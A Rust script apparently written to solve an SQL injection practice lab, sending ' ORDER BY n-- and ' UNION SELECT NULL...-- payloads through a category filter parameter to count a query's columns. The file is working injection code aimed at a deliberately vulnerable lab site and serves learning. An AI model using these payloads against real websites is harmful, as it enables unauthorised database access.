use server_side_sql_injection::{HTTP_CLIENT, check_is_lab_solved, generate_clap_parser};
use std::iter::repeat_n;

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    // NOTE: The UNION SELECT method is enough for solving this lab... I tried both methods for practice

    println!("[+] Determining the number of columns using ORDER BY...");

    let mut columns = 0;

    loop {
        columns += 1;

        let query = format!("' ORDER BY {}--", columns);

        println!(
            "[+] Making query {columns}: {}/filter?category={}",
            lab_url, query
        );

        if HTTP_CLIENT
            .get(format!("{}/filter?category={}", lab_url, query))
            .send()
            .expect("[-] Failed to make a GET request")
            .status()
            == 200
        {
            continue;
        } else {
            break;
        }
    }

    println!(
        "[+] The number of columns found using ORDER BY is {}",
        columns - 1
    );

    println!("[+] Determining the number of columns using UNION SELECT...");

    let mut columns = 1;

    loop {
        let payload = repeat_n("NULL", columns).collect::<Vec<&str>>().join(", ");
        let query = format!("' UNION SELECT {}--", payload);

        println!(
            "[+] Making query {columns}: {}/filter?category={}",
            lab_url, query
        );

        if HTTP_CLIENT
            .get(format!("{}/filter?category={}", lab_url, query))
            .send()
            .expect("[-] Failed to make a GET request")
            .status()
            == 200
        {
            break;
        } else {
            columns += 1;
        }
    }

    println!(
        "[+] The number of columns found using UNION SELECT is {}",
        columns
    );

    check_is_lab_solved(lab_url);
}
